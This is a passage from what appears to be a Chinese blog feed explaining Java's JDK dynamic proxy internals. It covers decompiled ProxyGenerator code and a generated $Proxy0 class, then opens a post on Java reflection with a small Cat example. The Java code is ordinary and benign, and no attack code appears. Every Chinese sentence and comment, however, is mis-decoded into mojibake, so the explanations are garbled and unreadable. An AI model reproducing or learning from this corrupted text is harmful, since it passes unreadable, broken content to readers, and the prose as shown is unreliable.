éœ€è¦å®ç°çš„ä»£ç†æ¥å£çš„æ•°é‡</span><br><br>    <span class="hljs-comment">// è®°å½•ä»£ç†æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•</span><br>    <span class="hljs-keyword">int</span> var3;<br>    Class var4;<br>    <span class="hljs-keyword">for</span>(var3 = <span class="hljs-number">0</span>; var3 &lt; var2; ++var3) &#123;<span class="hljs-comment">// å¾ªç¯å®ç°</span><br>        var4 = var1[var3];<span class="hljs-comment">// èµ‹å€¼</span><br>        Method[] var5 = var4.getMethods();<span class="hljs-comment">// è·å–æ‰€æœ‰éœ€è¦å¢å¼ºçš„æ–¹æ³•</span><br>        <span class="hljs-keyword">int</span> var6 = var5.length;<span class="hljs-comment">// var6 å°±æ˜¯ä»£ç†ç±»ä¸­æ–¹æ³•çš„æ€»æ•°</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var7 = <span class="hljs-number">0</span>; var7 &lt; var6; ++var7) &#123;<span class="hljs-comment">// å¾ªç¯è·å–ä»£ç†ç±»ä¸­è‡ªå®šä¹‰çš„æ–¹æ³•ä¿¡æ¯</span><br>            Method var8 = var5[var7];<br>            <span class="hljs-keyword">this</span>.addProxyMethod(var8, var4);<br>        &#125;<br>    &#125;<br><br>    Iterator var11 = <span class="hljs-keyword">this</span>.proxyMethods.values().iterator();<span class="hljs-comment">// å°†æ‰€æœ‰æ–¹æ³•æ”¾å…¥è¿­ä»£å™¨ä¸­</span><br><br>    List var12;<br>    <span class="hljs-keyword">while</span>(var11.hasNext()) &#123;<span class="hljs-comment">// å¾ªç¯æ£€æŸ¥è¿”å›ç±»å‹</span><br>        var12 = (List)var11.next();<br>        checkReturnTypes(var12);<br>    &#125;<br><br>    <span class="hljs-comment">// step2ï¼šç”Ÿæˆçš„ç±»ä¸­çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•ç»„è£…FieldInfoå’ŒMethodInfoç»“æ„</span><br>    Iterator var15;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">this</span>.methods.add(<span class="hljs-keyword">this</span>.generateConstructor());<br>        var11 = <span class="hljs-keyword">this</span>.proxyMethods.values().iterator();<br><br>        <span class="hljs-keyword">while</span>(var11.hasNext()) &#123;<br>            var12 = (List)var11.next();<br>            var15 = var12.iterator();<br><br>            <span class="hljs-keyword">while</span>(var15.hasNext()) &#123;<br>                ProxyGenerator.ProxyMethod var16 = (ProxyGenerator.ProxyMethod)var15.next();<br>                <span class="hljs-comment">// ä¸ºæ–¹æ³•çš„methodå¯¹è±¡æ·»åŠ é™æ€å­—æ®µ</span><br>                <span class="hljs-keyword">this</span>.fields.add(<span class="hljs-keyword">new</span> ProxyGenerator.FieldInfo(var16.methodFieldName, <span class="hljs-string">&quot;Ljava/lang/reflect/Method;&quot;</span>, <span class="hljs-number">10</span>));<br>                <span class="hljs-keyword">this</span>.methods.add(var16.generateMethod());<span class="hljs-comment">// ç”Ÿæˆä»£ç†æ–¹æ³•çš„ä»£ç å¹¶æ·»åŠ å®ƒ</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">this</span>.methods.add(<span class="hljs-keyword">this</span>.generateStaticInitializer());<span class="hljs-comment">// ä¸ºä»£ç†ç±»ç”Ÿæˆé™æ€åˆå§‹å€¼</span><br>    &#125; <span class="hljs-keyword">catch</span> (IOException var10) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InternalError(<span class="hljs-string">&quot;unexpected I/O Exception&quot;</span>, var10);<br>    &#125;<br><br>    <span class="hljs-comment">// æ ¡éªŒ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.methods.size() &gt; <span class="hljs-number">65535</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;method limit exceeded&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.fields.size() &gt; <span class="hljs-number">65535</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;field limit exceeded&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// ç”Ÿæˆé™æ€classæ–‡ä»¶å¹¶å†™å…¥</span><br>        <span class="hljs-comment">// å¼€å§‹ç¼–å†™æœ€ç»ˆç±»æ–‡ä»¶ä¹‹å‰ï¼Œç¡®ä¿ä¸ºä»¥ä¸‹é¡¹ä¿ç•™äº†å¸¸é‡æ± ç´¢å¼•ã€‚</span><br>        <span class="hljs-keyword">this</span>.cp.getClass(dotToSlash(<span class="hljs-keyword">this</span>.className));<br>        <span class="hljs-keyword">this</span>.cp.getClass(<span class="hljs-string">&quot;java/lang/reflect/Proxy&quot;</span>);<br>        var1 = <span class="hljs-keyword">this</span>.interfaces;<br>        var2 = var1.length;<br><br>        <span class="hljs-keyword">for</span>(var3 = <span class="hljs-number">0</span>; var3 &lt; var2; ++var3) &#123;<br>            var4 = var1[var3];<br>            <span class="hljs-keyword">this</span>.cp.getClass(dotToSlash(var4.getName()));<br>        &#125;<br><br>        <span class="hljs-keyword">this</span>.cp.setReadOnly();<span class="hljs-comment">// è®¾ç½®åªè¯»ï¼Œä¸å…è®¸åœ¨è¿™ä¸€ç‚¹ä¹‹åæ·»åŠ æ–°çš„å¸¸é‡æ± ï¼Œå› ä¸ºæˆ‘ä»¬å³å°†ç¼–å†™æœ€ç»ˆçš„å¸¸é‡æ± è¡¨</span><br>        ByteArrayOutputStream var13 = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        DataOutputStream var14 = <span class="hljs-keyword">new</span> DataOutputStream(var13);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// å¼€å§‹ç¼–å†™â€œClassFileâ€ç»“æ„çš„æ‰€æœ‰é¡¹ã€‚</span><br>            var14.writeInt(-<span class="hljs-number">889275714</span>);<br>            var14.writeShort(<span class="hljs-number">0</span>);<br>            var14.writeShort(<span class="hljs-number">49</span>);<br>            <span class="hljs-keyword">this</span>.cp.write(var14);<br>            var14.writeShort(<span class="hljs-keyword">this</span>.accessFlags);<br>            var14.writeShort(<span class="hljs-keyword">this</span>.cp.getClass(dotToSlash(<span class="hljs-keyword">this</span>.className)));<br>            var14.writeShort(<span class="hljs-keyword">this</span>.cp.getClass(<span class="hljs-string">&quot;java/lang/reflect/Proxy&quot;</span>));<br>            var14.writeShort(<span class="hljs-keyword">this</span>.interfaces.length);<span class="hljs-comment">// æ¥å£æ•°</span><br>            Class[] var17 = <span class="hljs-keyword">this</span>.interfaces;<br>            <span class="hljs-keyword">int</span> var18 = var17.length;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var19 = <span class="hljs-number">0</span>; var19 &lt; var18; ++var19) &#123;<br>                Class var22 = var17[var19];<br>                var14.writeShort(<span class="hljs-keyword">this</span>.cp.getClass(dotToSlash(var22.getName())));<br>            &#125;<br><br>            var14.writeShort(<span class="hljs-keyword">this</span>.fields.size());<span class="hljs-comment">// å­—æ®µæ•°</span><br>            var15 = <span class="hljs-keyword">this</span>.fields.iterator();<br><br>            <span class="hljs-keyword">while</span>(var15.hasNext()) &#123;<br>                ProxyGenerator.FieldInfo var20 = (ProxyGenerator.FieldInfo)var15.next();<br>                var20.write(var14);<br>            &#125;<br><br>            var14.writeShort(<span class="hljs-keyword">this</span>.methods.size());<span class="hljs-comment">// æ–¹æ³•æ•°</span><br>            var15 = <span class="hljs-keyword">this</span>.methods.iterator();<br><br>            <span class="hljs-keyword">while</span>(var15.hasNext()) &#123;<br>                ProxyGenerator.MethodInfo var21 = (ProxyGenerator.MethodInfo)var15.next();<br>                var21.write(var14);<br>            &#125;<br><br>            var14.writeShort(<span class="hljs-number">0</span>);<span class="hljs-comment">// ä»£ç†ç±»æ²¡æœ‰ClassFileå±æ€§</span><br>            <span class="hljs-keyword">return</span> var13.toByteArray();<span class="hljs-comment">// è¿”å›å­—èŠ‚æ•°ç»„</span><br>        &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InternalError(<span class="hljs-string">&quot;unexpected I/O Exception&quot;</span>, var9);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// è·å–ä»£ç†ç±»ä¸­è‡ªå®šä¹‰çš„æ–¹æ³•ä¿¡æ¯</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addProxyMethod</span><span class="hljs-params">(Method var1, Class&lt;?&gt; var2)</span> </span>&#123;<br>    String var3 = var1.getName();<span class="hljs-comment">// è·å–æ–¹æ³•å</span><br>    Class[] var4 = var1.getParameterTypes();<span class="hljs-comment">// å‚æ•°ç±»å‹</span><br>    Class var5 = var1.getReturnType();<span class="hljs-comment">// è¿”å›ç±»å‹</span><br>    Class[] var6 = var1.getExceptionTypes();<span class="hljs-comment">// å¼‚å¸¸ç±»å‹</span><br>    String var7 = var3 + getParameterDescriptors(var4);<span class="hljs-comment">// è·å–å‚æ•°æè¿°ç¬¦ æ–¹æ³•å + ( + å‚æ•° + )</span><br>    Object var8 = (List)<span class="hljs-keyword">this</span>.proxyMethods.get(var7);<span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨equalsã€toStringã€hashCodeæ–¹æ³•</span><br>    <span class="hljs-keyword">if</span> (var8 != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// æ²¡æœ‰é‡å†™ä¸Šé¢ä¸‰ä¸ªæ–¹æ³•çš„è¯åˆ™ç›´æ¥è·³è¿‡</span><br>        Iterator var9 = ((List)var8).iterator();<br><br>        <span class="hljs-keyword">while</span>(var9.hasNext()) &#123;<br>            ProxyGenerator.ProxyMethod var10 = (ProxyGenerator.ProxyMethod)var9.next();<br>            <span class="hljs-keyword">if</span> (var5 == var10.returnType) &#123;<br>                ArrayList var11 = <span class="hljs-keyword">new</span> ArrayList();<br>                collectCompatibleTypes(var6, var10.exceptionTypes, var11);<br>                collectCompatibleTypes(var10.exceptionTypes, var6, var11);<br>                var10.exceptionTypes = <span class="hljs-keyword">new</span> Class[var11.size()];<br>                var10.exceptionTypes = (Class[])var11.toArray(var10.exceptionTypes);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        var8 = <span class="hljs-keyword">new</span> ArrayList(<span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">this</span>.proxyMethods.put(var7, var8);<span class="hljs-comment">// å°†è‡ªå®šä¹‰çš„ä»£ç†æ–¹æ³•å¢åŠ åˆ° this.proxyMethods Mapä¸­ </span><br>    &#125;<br>    <span class="hljs-comment">// å°†ä»£ç†æ–¹æ³• çš„ä¿¡æ¯å¢åŠ è‡³List var8ä¸­</span><br>    <span class="hljs-comment">// æœ€ç»ˆæ˜¯å¢åŠ åˆ°äº†sun.misc.ProxyGeneratorçš„proxyMethodsé™æ€å˜é‡ä¸­</span><br>    ((List)var8).add(<span class="hljs-keyword">new</span> ProxyGenerator.ProxyMethod(var3, var4, var5, var6, var2));<br>&#125;<br></code></pre></td></tr></table></figure><p>OKï¼Œå®Œå·¥ï¼Œæœ€ç»ˆç”Ÿæˆä»£ç†ç±»çš„åœ¨<code>sun.misc.ProxyGenerator#generateClassFile</code>ï¼Œç”Ÿæˆä»£ç†ç±»çš„æ­¥éª¤ä¹Ÿå°±æ˜¯ä»¥ä¸‹ä¸‰æ­¥ï¼š</p><ol><li>ä¸ºæ‰€æœ‰æ–¹æ³•ç»„è£…<code>ProxyMethod</code>å¯¹è±¡ä»¥ç”Ÿæˆä»£ç†åˆ†æ´¾ä»£ç </li><li>ç”Ÿæˆçš„ç±»ä¸­çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•ç»„è£…<code>FieldInfo</code>å’Œ<code>MethodInfo</code>ç»“æ„</li><li>å†™<code>class File</code>ï¼Œå†™å…¥å­—èŠ‚æ•°ç»„ï¼Œæ ¹æ®<code>saveGeneratedFiles</code>æ¥å†³å®šæ˜¯å¦ç”Ÿæˆæœ¬åœ°æ–‡ä»¶</li></ol><p>ä¸Šé¢çš„ä»£ç æ˜¯.classæ–‡ä»¶ï¼Œçœ‹èµ·æ¥æœ‰äº›åƒåŠ›ï¼Œå¯ä»¥åœ¨<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/log?rev=sun/misc/ProxyGenerator">JDKæºç </a>å¤„æŠŠsunåŒ…ä¸‹è½½ä¸‹æ¥ï¼Œå¤åˆ¶åˆ°jdkå¯¹åº”çš„ç›®å½•ä¸‹</p><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/7.png"></p><p>æ¥çœ‹ä¸€ä¸‹ç”Ÿæˆçš„åŠ¨æ€ä»£ç†æ–‡ä»¶ï¼Œéœ€è¦ç°åœ¨æµ‹è¯•ç±»ä¸­å¢åŠ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.getProperties().put(<span class="hljs-string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/6.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sun.proxy;<br><br><span class="hljs-keyword">import</span> com.example.proxy.ProducePhone;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.lang.reflect.UndeclaredThrowableException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $<span class="hljs-title">Proxy0</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProducePhone</span> </span>&#123;<br>    <span class="hljs-comment">// ç§æœ‰é™æ€æ„é€ æ–¹æ³•,hashCodeã€equalsã€toStringå’Œè‡ªå®šä¹‰çš„ä¸¤ä¸ªæ–¹æ³•</span><br>    <span class="hljs-comment">// åœ¨åˆå§‹åŒ–çš„æ—¶å€™é™æ€ä»£ç å—å¤„é€šè¿‡åå°„è·å–å…¶Mecthod</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m1;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m2;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m4;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m3;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m0;<br><br>    <span class="hljs-keyword">public</span> $Proxy0(InvocationHandler var1) <span class="hljs-keyword">throws</span>  &#123;<span class="hljs-comment">// æ„é€ æ–¹æ³•</span><br>        <span class="hljs-keyword">super</span>(var1);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object var1)</span> <span class="hljs-keyword">throws</span>  </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> (Boolean)<span class="hljs-keyword">super</span>.h.invoke(<span class="hljs-keyword">this</span>, m1, <span class="hljs-keyword">new</span> Object[]&#123;var1&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var3) &#123;<br>            <span class="hljs-keyword">throw</span> var3;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UndeclaredThrowableException(var4);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> (String)<span class="hljs-keyword">super</span>.h.invoke(<span class="hljs-keyword">this</span>, m2, (Object[])<span class="hljs-keyword">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var2) &#123;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UndeclaredThrowableException(var3);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// è°ƒç”¨å¤„ç†å™¨ä¸­çš„ invoke æ–¹æ³•è¿›è¡Œå¤„ç†</span><br>    <span class="hljs-comment">// h:protected InvocationHandler h;</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">qualityTesting</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  </span>&#123;<span class="hljs-comment">// invocation</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// this:ä»£ç†ç±»</span><br>            <span class="hljs-comment">// m: æ–¹æ³•å</span><br>            <span class="hljs-comment">// å‚æ•°</span><br>            <span class="hljs-keyword">super</span>.h.invoke(<span class="hljs-keyword">this</span>, m4, (Object[])<span class="hljs-keyword">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var2) &#123;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UndeclaredThrowableException(var3);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">super</span>.h.invoke(<span class="hljs-keyword">this</span>, m3, (Object[])<span class="hljs-keyword">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var2) &#123;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UndeclaredThrowableException(var3);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> (Integer)<span class="hljs-keyword">super</span>.h.invoke(<span class="hljs-keyword">this</span>, m0, (Object[])<span class="hljs-keyword">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var2) &#123;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UndeclaredThrowableException(var3);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–ä»£ç†ç±»éœ€è¦ç”¨åˆ°çš„æ–¹æ³•</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            m1 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;equals&quot;</span>, Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>));<br>            m2 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;toString&quot;</span>);<br>            m4 = Class.forName(<span class="hljs-string">&quot;com.example.proxy.ProducePhone&quot;</span>).getMethod(<span class="hljs-string">&quot;qualityTesting&quot;</span>);<br>            m3 = Class.forName(<span class="hljs-string">&quot;com.example.proxy.ProducePhone&quot;</span>).getMethod(<span class="hljs-string">&quot;producePhone&quot;</span>);<br>            m0 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var2) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchMethodError(var2.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoClassDefFoundError(var3.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åŸºäºç±»çš„åŠ¨æ€ä»£ç†"><a href="#åŸºäºç±»çš„åŠ¨æ€ä»£ç†" class="headerlink" title="åŸºäºç±»çš„åŠ¨æ€ä»£ç†"></a>åŸºäºç±»çš„åŠ¨æ€ä»£ç†</h4><p>ç±»çš„åŠ¨æ€ä»£ç†ï¼Œéœ€è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼Œå¦‚CGLIBã€‚è¿™é‡Œæš‚æ—¶ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡æœ‰æ·±å…¥å­¦ä¹ </p><p>å‡†ç¡®çš„è¯´æ˜¯å¤ªèœäº†ğŸ˜¥ï¼Œå•¥ä¹Ÿä¸ä¼šï¼Œå•¥ä¹Ÿä¸æ˜¯..</p><h3 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h3><p>ä¸ªäººæ„Ÿè§‰ï¼ŒåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œå…¶å®å°±æ˜¯jdkå¸®åŠ©å¼€å‘äººå‘˜å‡è½»ä»£ç é‡ï¼Œåˆ†æä¸€ä¸‹ä»£ç (å‡†ç¡®çš„è¯´æ˜¯çœ‹ä¸€ä¸‹æºç çš„æ³¨é‡Š)ï¼Œç„¶åè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£çš„ã€‚</p><h3 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h3><ul><li><a href="https://xz.aliyun.com/t/9197">JAVAå®‰å…¨åŸºç¡€ï¼ˆä¸‰ï¼‰â€“ javaåŠ¨æ€ä»£ç†æœºåˆ¶</a></li><li><a href="https://www.cnblogs.com/JoJo1021/p/16327895.html"><a href="https://www.cnblogs.com/JoJo1021/p/16327895.html">JDKåŠ¨æ€ä»£ç†æºç è§£æ </a></a></li><li><a href="https://blog.csdn.net/JacksonKing/article/details/102974895">æ·±åº¦å‰–æJDKåŠ¨æ€ä»£ç†æœºåˆ¶</a></li><li><a href="https://blog.csdn.net/qq_33259067/article/details/127097971">SpringAOPâ€“JDKåŠ¨æ€ä»£ç†æºç è§£æ</a></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk">JDKæºç </a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>JavaåŸºç¡€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java åå°„</title>
    <link href="/2022/08/27/Java%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/08/27/Java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h2 id="Java-åå°„ï¼ˆreflectionï¼‰"><a href="#Java-åå°„ï¼ˆreflectionï¼‰" class="headerlink" title="Java åå°„ï¼ˆreflectionï¼‰"></a>Java åå°„ï¼ˆreflectionï¼‰</h2><p>åå°„çš„å¼•å…¥ï¼Œå½“çŸ¥é“ä¸€ä¸ªç±»çš„ç±»åæ—¶ï¼Œæƒ³é€šè¿‡ç¨‹åºè‡ªåŠ¨å¼•å…¥/åˆ›å»ºï¼Œä¼ ç»Ÿæ–¹æ³•æ˜¯æ— æ³•å®ç°ï¼Œå› ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> ç±»å--&gt; å…¶ä¸­ç±»åæ— æ³•æ˜¯å…¶ä»–ç±»å‹çš„æ•°æ®ï¼Œå¿…é¡»ç”±ç¼–å†™äººå‘˜è¿›è¡Œç¼–å†™<br>--&gt; æ— æ³•å®ç°åŠ¨æ€çš„è·å–æŸä¸ªæŒ‡å®šçš„ç±»<br>--&gt; å› æ­¤å¼•å…¥åå°„<br></code></pre></td></tr></table></figure><p>åå°„çœŸæ­£è¦å®ç°çš„ï¼šé€šè¿‡<strong>å¤–éƒ¨æ–‡ä»¶é…ç½®</strong>ï¼Œåœ¨<strong>ä¸ä¿®æ”¹æºç </strong>çš„æƒ…å†µï¼Œæ¥<strong>æ§åˆ¶ç¨‹åº</strong>ï¼Œè®©Javaä»£ç æ‹¥æœ‰ä¸€å®šçš„åŠ¨æ€ç‰¹æ€§ã€‚</p><h3 id="åå°„çš„Hello-World"><a href="#åå°„çš„Hello-World" class="headerlink" title="åå°„çš„Hello World"></a>åå°„çš„Hello World</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¸€ä¸ªç­‰ä¸‹ç”±åå°„è°ƒç”¨çš„ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name = <span class="hljs-string">&quot;æ‹›è´¢çŒ«&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hi</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hi &quot;</span> + word);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectionQuestion</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 